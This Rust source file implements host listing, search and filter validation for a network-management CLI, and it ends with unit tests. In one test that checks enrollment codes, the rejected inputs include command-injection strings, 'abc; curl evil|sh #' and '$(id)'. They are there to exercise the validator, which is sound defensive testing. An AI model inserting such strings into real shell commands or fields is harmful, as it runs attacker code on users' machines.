mod create;
mod debug;
mod delete;
mod edit;
mod get;
mod lifecycle;
mod wait;

pub use create::{hosts_create, validate_create_preflight};
pub(crate) use create::{network_ipv4_cidr, pick_network};
pub use debug::hosts_debug;
pub use delete::hosts_delete;
pub use edit::{hosts_edit, validate_edit_preflight};
pub use get::hosts_get;
pub(crate) use get::role_name;
pub use lifecycle::{hosts_block, hosts_enroll_code, hosts_unblock};
pub use wait::{hosts_wait, validate_wait_preflight};

use std::net::IpAddr;

use anyhow::{anyhow, bail};
use serde_json::Value;

use crate::api::Client;
use crate::cli::{HostFilterArgs, HostListArgs, HostSearchArgs, PageArgs};
use crate::ids::validate_id_shape;
use crate::output::{OutputMode, joined_field, print_list, sanitize_for_display, str_field};

pub fn hosts_list(client: &Client, args: &HostListArgs, output: OutputMode) -> anyhow::Result<()> {
    list_hosts(
        client,
        args.search.as_deref(),
        &args.filters,
        &args.page,
        output,
    )
}

/// `dn host search <QUERY>` is `dn host list --search <QUERY>` with the
/// query as a positional: the same request, the same rendering.
pub fn hosts_search(
    client: &Client,
    args: &HostSearchArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    list_hosts(
        client,
        Some(&search_query(args)),
        &args.filters,
        &args.page,
        output,
    )
}

/// One page of `GET /v2/hosts`, narrowed by `filter.search` when there is a
/// search term and by every other filter given.
fn list_hosts(
    client: &Client,
    search: Option<&str>,
    filters: &HostFilterArgs,
    page: &PageArgs,
    output: OutputMode,
) -> anyhow::Result<()> {
    let res = client.list_hosts(&host_filters(search, filters), page)?;
    let empty = empty_message(search, filters);
    print_list(&res, output, &empty, &HOST_HEADERS, host_rows)
}

/// What an empty page prints. It names what was asked for when the request
/// named something specific (a search term, a name, an address), so a miss
/// reads as "nothing has that" and not as "you have no hosts".
fn empty_message(search: Option<&str>, filters: &HostFilterArgs) -> String {
    let quoted = |s: &str| format!("\"{}\"", sanitize_for_display(s));
    match (search, &filters.name, &filters.ip) {
        (Some(query), _, _) => format!("No hosts match {}.", quoted(query)),
        (None, Some(name), Some(ip)) => format!(
            "No host is named {} with the address {}.",
            quoted(name),
            sanitize_for_display(ip)
        ),
        (None, Some(name), None) => format!("No host is named {}.", quoted(name)),
        (None, None, Some(ip)) => {
            format!("No host has the address {}.", sanitize_for_display(ip))
        }
        (None, None, None) => "No hosts found.".to_string(),
    }
}

/// Reject filter values the API would reject anyway, before credentials are
/// resolved or the wire is touched. Ids must have the shape the API issues
/// (`filter.roleID` and friends also accept `any` / `null`); tags must be
/// `key:value`. The API stays the authority on whether an id exists.
pub fn validate_list_preflight(args: &HostListArgs) -> anyhow::Result<()> {
    if let Some(query) = &args.search {
        validate_search_length(query).map_err(|e| anyhow!("--search: {e}"))?;
    }
    validate_filters(&args.filters)
}

/// The API answers a `filter.search` shorter than two characters with 400
/// `ERR_TOO_SHORT`. Counted in `char`s, not bytes, so a two-emoji query
/// passes.
fn validate_search_length(query: &str) -> anyhow::Result<()> {
    if query.chars().count() < 2 {
        bail!("search query must be at least 2 characters");
    }
    Ok(())
}

fn validate_filters(filters: &HostFilterArgs) -> anyhow::Result<()> {
    for (flag, kind, prefix, value) in [
        ("--role", "role", "role", &filters.role),
        ("--network", "network", "network", &filters.network),
        (
            "--oidc-user",
            "endpoint OIDC user",
            "eoidcuser",
            &filters.oidc_user,
        ),
    ] {
        if let Some(value) = value
            && !(kind != "network" && matches!(value.as_str(), "any" | "null"))
        {
            validate_id_shape(kind, prefix, value).map_err(|e| anyhow!("{flag}: {e}"))?;
        }
    }
    for tag in &filters.tag {
        parse_tag(tag).map_err(|e| anyhow!("--tag: {e}"))?;
    }
    if let Some(ip) = &filters.ip
        && ip.parse::<IpAddr>().is_err()
    {
        bail!(
            "--ip: \"{}\" is not an IPv4 or IPv6 address",
            sanitize_for_display(ip)
        );
    }
    Ok(())
}

/// The `filter.*` query parameters for a search term and a set of host
/// filters: `filter.search` first, then the rest in flag order.
/// Booleans serialise as `true` / `false`; `--never-seen` is the API's
/// `filter.metadata.lastSeenAt=null`; `--tag` repeats, one parameter per tag.
fn host_filters<'a>(
    search: Option<&'a str>,
    filters: &'a HostFilterArgs,
) -> Vec<(&'static str, &'a str)> {
    fn flag(b: bool) -> &'static str {
        if b { "true" } else { "false" }
    }
    let mut params: Vec<(&'static str, &str)> = Vec::new();
    if let Some(search) = search {
        params.push(("filter.search", search));
    }
    if let Some(name) = &filters.name {
        params.push(("filter.name", name));
    }
    if let Some(ip) = &filters.ip {
        params.push(("filter.ipAddress", ip));
    }
    if let Some(role) = &filters.role {
        params.push(("filter.roleID", role));
    }
    if let Some(network) = &filters.network {
        params.push(("filter.networkID", network));
    }
    for tag in &filters.tag {
        params.push(("filter.tag", tag));
    }
    if let Some(b) = filters.lighthouse {
        params.push(("filter.isLighthouse", flag(b)));
    }
    if let Some(b) = filters.relay {
        params.push(("filter.isRelay", flag(b)));
    }
    if let Some(b) = filters.blocked {
        params.push(("filter.isBlocked", flag(b)));
    }
    if let Some(b) = filters.update_available {
        params.push(("filter.metadata.updateAvailable", flag(b)));
    }
    if let Some(platform) = &filters.platform {
        params.push(("filter.metadata.platform", platform));
    }
    if filters.never_seen {
        params.push(("filter.metadata.lastSeenAt", "null"));
    }
    if let Some(user) = &filters.oidc_user {
        params.push(("filter.endpointOIDCUserID", user));
    }
    params
}

/// The `filter.search` term for `dn host search`, joined from the argv words
/// and trimmed. The join means `dn host search web server` searches for the
/// single phrase "web server" rather than erroring on an extra positional.
fn search_query(args: &HostSearchArgs) -> String {
    args.query.join(" ").trim().to_string()
}

/// Reject a query the API would reject anyway (fewer than two characters →
/// 400 `ERR_TOO_SHORT`), before credentials are resolved or the wire is
/// touched — the same preflight contract as create/edit.
pub fn validate_search_preflight(args: &HostSearchArgs) -> anyhow::Result<()> {
    validate_search_length(&search_query(args))?;
    validate_filters(&args.filters)
}

const HOST_HEADERS: [&str; 3] = ["ID", "NAME", "IP ADDRESSES"];

fn host_rows(rows: &[Value]) -> Vec<Vec<String>> {
    rows.iter()
        .map(|row| {
            let (id, name, ip) = host_fields(row);
            vec![id.to_string(), name.to_string(), ip]
        })
        .collect()
}

/// Parse and validate a `key:value` tag, matching the server's rules:
/// exactly one colon, key 1–20 chars, value 1–50 chars, no
/// leading/trailing whitespace on either part.
pub fn parse_tag(s: &str) -> anyhow::Result<(String, String)> {
    let s = s.trim();
    let shown = sanitize_for_display(s);
    let (k, v) = s
        .split_once(':')
        .ok_or_else(|| anyhow!("invalid tag \"{shown}\" — expected key:value"))?;
    if k.is_empty() || v.is_empty() {
        bail!("invalid tag \"{shown}\" — key and value must both be non-empty");
    }
    if k != k.trim() || v != v.trim() {
        bail!("tag key and value must not have leading/trailing whitespace");
    }
    if k.chars().count() > 20 {
        bail!(
            "tag key \"{}\" exceeds 20-character limit",
            sanitize_for_display(k)
        );
    }
    if v.chars().count() > 50 {
        bail!(
            "tag value \"{}\" exceeds 50-character limit",
            sanitize_for_display(v)
        );
    }
    Ok((k.to_string(), v.to_string()))
}

/// An enrollment code from an API response, if it looks like one the API
/// issues: 1–256 characters of base64url (`A-Z a-z 0-9 - _`). The human views
/// print it inside a `dnclient enroll -code <code>` line the user pastes into a
/// shell, so anything else (empty, shell metacharacters, bidi or zero-width
/// characters from a hostile or broken server) must never reach that line.
pub(crate) fn checked_enroll_code(code: &str) -> anyhow::Result<&str> {
    if code.is_empty() {
        bail!("unexpected response: missing enrollment code");
    }
    if code.len() > 256
        || !code
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_'))
    {
        bail!(
            "unexpected response: the enrollment code isn't in the expected format, \
             so no command to run is shown (pass --json to see the raw response)"
        );
    }
    Ok(code)
}

/// The three columns the human host table renders. `id` and `name` fall back
/// to an empty string when absent or non-string; the IP column joins the v2
/// `ipAddresses` array (dual-stack: IPv4 and/or IPv6) with ", ".
fn host_fields(row: &Value) -> (&str, &str, String) {
    (
        str_field(row, "id"),
        str_field(row, "name"),
        joined_field(row, "ipAddresses"),
    )
}

#[cfg(test)]
mod tests {
    use clap::Parser;
    use serde_json::json;

    use super::*;
    use crate::cli::{Cli, Command, HostCommand};

    #[test]
    fn host_fields_extracts_present_columns() {
        // Dual-stack: v2 returns an ipAddresses array (IPv4 + IPv6).
        let row = json!({"id": "host-FBNRAHQYQLWXWMCY7L4XP46ZXI", "name": "web", "ipAddresses": ["10.0.0.1", "fd00::1"]});
        assert_eq!(
            host_fields(&row),
            (
                "host-FBNRAHQYQLWXWMCY7L4XP46ZXI",
                "web",
                "10.0.0.1, fd00::1".to_string()
            )
        );
    }

    #[test]
    fn host_fields_defaults_missing_or_wrong_type() {
        // Missing name, and ipAddresses that isn't an array of strings.
        let row = json!({"id": "host-GCCZWU56GO7XSZN2X575Z7T5JI", "ipAddresses": 42});
        assert_eq!(
            host_fields(&row),
            ("host-GCCZWU56GO7XSZN2X575Z7T5JI", "", String::new())
        );
    }

    #[test]
    fn host_fields_skips_non_string_ip_entries() {
        let row = json!({"id": "host-7PIHWVV3JUVWM7OTQLR5WJZAA4", "name": "db", "ipAddresses": ["10.0.0.2", 7, "fd00::2"]});
        assert_eq!(
            host_fields(&row),
            (
                "host-7PIHWVV3JUVWM7OTQLR5WJZAA4",
                "db",
                "10.0.0.2, fd00::2".to_string()
            )
        );
    }

    #[test]
    fn search_query_joins_multiple_words_with_a_space() {
        // `dn host search web server` is one phrase, not a bad extra arg.
        let cli = Cli::try_parse_from(["dn", "host", "search", "web", "server"]).unwrap();
        let Command::Host {
            command: HostCommand::Search(args),
        } = cli.command
        else {
            panic!("expected `host search` to parse into HostCommand::Search");
        };
        assert_eq!(search_query(&args), "web server");
    }

    fn search_args(query: &[&str]) -> HostSearchArgs {
        HostSearchArgs {
            query: query.iter().map(|s| (*s).to_string()).collect(),
            filters: HostFilterArgs::default(),
            page: PageArgs::default(),
        }
    }

    fn list_args(argv: &[&str]) -> HostListArgs {
        let cli = Cli::try_parse_from(["dn", "host", "list"].iter().chain(argv)).unwrap();
        match cli.command {
            Command::Host {
                command: HostCommand::List(args),
            } => args,
            _ => unreachable!(),
        }
    }

    #[test]
    fn no_filter_flags_send_no_filter_params() {
        assert!(host_filters(None, &list_args(&[]).filters).is_empty());
    }

    #[test]
    fn every_filter_flag_maps_to_its_query_parameter() {
        let args = list_args(&[
            "--search=web",
            "--name=gw-1",
            "--ip=fd00::5",
            "--role=role-6TZVMAEXCQB4WXWTY5XY6HG7DI",
            "--network=network-CBLAIQENR5J7VAXT4HJ5ZALNXA",
            "--tag=env:prod",
            "--tag=region:us",
            "--lighthouse",
            "--relay=false",
            "--blocked=true",
            "--update-available=false",
            "--platform=dnclient",
            "--never-seen",
            "--oidc-user=any",
        ]);
        assert_eq!(
            host_filters(args.search.as_deref(), &args.filters),
            [
                ("filter.search", "web"),
                ("filter.name", "gw-1"),
                ("filter.ipAddress", "fd00::5"),
                ("filter.roleID", "role-6TZVMAEXCQB4WXWTY5XY6HG7DI"),
                ("filter.networkID", "network-CBLAIQENR5J7VAXT4HJ5ZALNXA"),
                ("filter.tag", "env:prod"),
                ("filter.tag", "region:us"),
                ("filter.isLighthouse", "true"),
                ("filter.isRelay", "false"),
                ("filter.isBlocked", "true"),
                ("filter.metadata.updateAvailable", "false"),
                ("filter.metadata.platform", "dnclient"),
                ("filter.metadata.lastSeenAt", "null"),
                ("filter.endpointOIDCUserID", "any"),
            ]
        );
    }

    #[test]
    fn list_preflight_accepts_any_and_null_for_role_and_oidc_user() {
        for argv in [
            ["--role=any"],
            ["--role=null"],
            ["--oidc-user=null"],
            ["--role=role-ABCDEFGHIJKLMNOPQRSTUVWXYZ"],
            ["--network=network-01234567890123456789012345"],
            ["--oidc-user=eoidcuser-ABCDEFGHIJKLMNOPQRSTUVWXYZ"],
            ["--ip=10.0.0.5"],
            ["--ip=fd00:0:0:0:0:0:0:5"],
            ["--search=ab"],
            ["--search=日本"],
        ] {
            assert!(
                validate_list_preflight(&list_args(&argv)).is_ok(),
                "{argv:?}"
            );
        }
    }

    #[test]
    fn list_preflight_rejects_malformed_ids_and_tags() {
        for (argv, want) in [
            (
                ["--role=role/1"],
                "--role: role id contains invalid character '/'",
            ),
            (["--role=notarole"], "--role: role id must look like role-"),
            (["--role=role-ABC_1"], "must look like role-"),
            (
                ["--network=any"],
                "--network: network id must look like network-",
            ),
            (
                ["--oidc-user=user-ABCDEFGHIJKLMNOPQRSTUVWXYZ"],
                "must look like eoidcuser-",
            ),
            (
                ["--network=net work"],
                "network id contains invalid character ' '",
            ),
            (
                ["--oidc-user=u?x"],
                "endpoint OIDC user id contains invalid character '?'",
            ),
            (["--tag=noseparator"], "--tag: "),
            (["--ip=10.0.0"], "--ip: \"10.0.0\" is not an IPv4 or IPv6"),
            (["--ip=gw-1"], "--ip: "),
            (["--search=a"], "--search: search query must be at least 2"),
        ] {
            let err = validate_list_preflight(&list_args(&argv)).unwrap_err();
            assert!(err.to_string().contains(want), "{argv:?}: {err}");
        }
    }

    #[test]
    fn platform_flag_takes_any_name_the_api_might_report() {
        // The documented values are examples, not a closed list: the API
        // reports platforms the spec doesn't enumerate.
        for platform in ["mobile", "dnclient-desktop", "null", "some-new-client"] {
            assert_eq!(
                list_args(&[&format!("--platform={platform}")])
                    .filters
                    .platform
                    .as_deref(),
                Some(platform)
            );
        }
        assert!(Cli::try_parse_from(["dn", "host", "list", "--platform="]).is_err());
        assert!(Cli::try_parse_from(["dn", "host", "list", "--platform", " "]).is_err());
    }

    #[test]
    fn search_preflight_checks_the_shared_filters_too() {
        let cli = Cli::try_parse_from(["dn", "host", "search", "web", "--tag=bad"]).unwrap();
        let Command::Host {
            command: HostCommand::Search(args),
        } = cli.command
        else {
            unreachable!()
        };
        assert!(validate_search_preflight(&args).is_err());
    }

    #[test]
    fn search_preflight_accepts_a_two_character_query() {
        assert!(validate_search_preflight(&search_args(&["ab"])).is_ok());
    }

    #[test]
    fn search_preflight_rejects_a_one_character_query() {
        let err = validate_search_preflight(&search_args(&["a"]))
            .unwrap_err()
            .to_string();
        assert!(err.contains("at least 2 characters"));
    }

    #[test]
    fn search_preflight_rejects_a_whitespace_only_query() {
        // Trimming happens before the length check, so spaces don't pad a
        // too-short query past the minimum.
        assert!(validate_search_preflight(&search_args(&["  "])).is_err());
    }

    #[test]
    fn search_preflight_counts_characters_not_bytes() {
        // Two multi-byte chars are two characters, not four+ bytes' worth.
        assert!(validate_search_preflight(&search_args(&["日本"])).is_ok());
    }

    #[test]
    fn an_empty_page_names_what_was_asked_for() {
        for (argv, want) in [
            (&[][..], "No hosts found."),
            (&["--role=null"][..], "No hosts found."),
            (&["--search=web"][..], "No hosts match \"web\"."),
            (
                &["--search=web", "--name=gw-1"][..],
                "No hosts match \"web\".",
            ),
            (&["--name=gw-1"][..], "No host is named \"gw-1\"."),
            (&["--ip=10.0.0.5"][..], "No host has the address 10.0.0.5."),
            (
                &["--name=gw-1", "--ip=fd00::5"][..],
                "No host is named \"gw-1\" with the address fd00::5.",
            ),
        ] {
            let args = list_args(argv);
            assert_eq!(
                empty_message(args.search.as_deref(), &args.filters),
                want,
                "{argv:?}"
            );
        }
    }

    #[test]
    fn parse_tag_splits_on_first_colon() {
        let (k, v) = parse_tag("dns:cloudflare").unwrap();
        assert_eq!(k, "dns");
        assert_eq!(v, "cloudflare");
    }

    #[test]
    fn parse_tag_preserves_colons_in_value() {
        let (k, v) = parse_tag("url:https://example.com").unwrap();
        assert_eq!(k, "url");
        assert_eq!(v, "https://example.com");
    }

    #[test]
    fn parse_tag_rejects_missing_colon() {
        assert!(parse_tag("novalue").is_err());
    }

    #[test]
    fn parse_tag_rejects_empty_key_or_value() {
        assert!(parse_tag(":val").is_err());
        assert!(parse_tag("key:").is_err());
    }

    #[test]
    fn parse_tag_rejects_long_key() {
        let long_key = "k".repeat(21);
        assert!(parse_tag(&format!("{long_key}:v")).is_err());
        let ok_key = "k".repeat(20);
        assert!(parse_tag(&format!("{ok_key}:v")).is_ok());
    }

    #[test]
    fn parse_tag_rejects_long_value() {
        let long_val = "v".repeat(51);
        assert!(parse_tag(&format!("k:{long_val}")).is_err());
        let ok_val = "v".repeat(50);
        assert!(parse_tag(&format!("k:{ok_val}")).is_ok());
    }

    #[test]
    fn parse_tag_rejects_whitespace_padding() {
        assert!(parse_tag(" key :value").is_err());
        assert!(parse_tag("key: value ").is_err());
    }

    #[test]
    fn parse_tag_errors_strip_terminal_escapes() {
        let err = parse_tag("\u{1b}[31mnocolon").unwrap_err().to_string();
        assert!(!err.contains('\u{1b}'), "{err:?}");
    }

    #[test]
    fn enroll_codes_must_be_base64url() {
        for ok in ["H8NEbm99QvupjqW1PsdVR9DNSiFmoQtJXyGTQxerlSU", "a-b_c", "x"] {
            assert_eq!(checked_enroll_code(ok).unwrap(), ok);
        }
        let long = "a".repeat(257);
        for bad in [
            "",
            "abc; curl evil|sh #",
            "abc def",
            "abc\u{202e}def",
            "abc\u{200b}",
            "$(id)",
            long.as_str(),
        ] {
            assert!(checked_enroll_code(bad).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn host_table() {
        let res = json!({ "data": [
            {
                "id": "host-KQ4ZB7MXRWEPNA2C5TJ3YVHLDI",
                "name": "Build Server",
                "ipAddresses": ["10.128.0.12", "fd00:c0:c0:2966:d3bf:a55d:49a0:6f18"],
                "metadata": {
                    "lastSeenAt": "2026-10-09T18:27:45Z",
                    "platform": "dnclient-desktop",
                    "version": "0.9.9-dev",
                    "os": "windows",
                    "updateAvailable": true,
                },
            },
            {
                "id": "host-RPWX5N2TQZ7HDK3MAYCEVLJ4GB",
                "name": "alex@example.com-oidc-host-3niCOb0p",
                "ipAddresses": ["10.128.1.66", "fd00:c0:c0:2966:d3bf:4aef:886d:b175"],
                "metadata": {
                    "lastSeenAt": "2026-10-08T22:24:17Z",
                    "platform": "nebula-apple",
                    "version": "1.0.0",
                    "os": "macos",
                    "updateAvailable": false,
                },
            },
            {
                "id": "host-M6TLA3VZQ2NXKC7EWJR5PBYHFO",
                "name": "Pixel Phone",
                "ipAddresses": ["10.128.1.39"],
                "metadata": {
                    "lastSeenAt": "2026-10-09T02:21:22Z",
                    "platform": "mobile",
                    "version": "0.12.0",
                    "os": "android",
                    "updateAvailable": false,
                },
            },
            {
                "id": "host-Z3HWQ5ATVK2MRXE7NC4YLBPJDG",
                "name": "\u{2601}\u{fe0f} cloud relay",
                "ipAddresses": ["10.128.2.7"],
                "metadata": { "lastSeenAt": null, "os": null },
            },
        ]});
        let rows = host_rows(res["data"].as_array().unwrap());
        insta::with_settings!({
            description => "Human host table: a dual-stack row, a long OIDC host name, a single-IP row, and an emoji name.",
            omit_expression => true,
        }, {
            insta::assert_snapshot!(crate::output::render_table(&HOST_HEADERS, &rows));
        });
    }
}
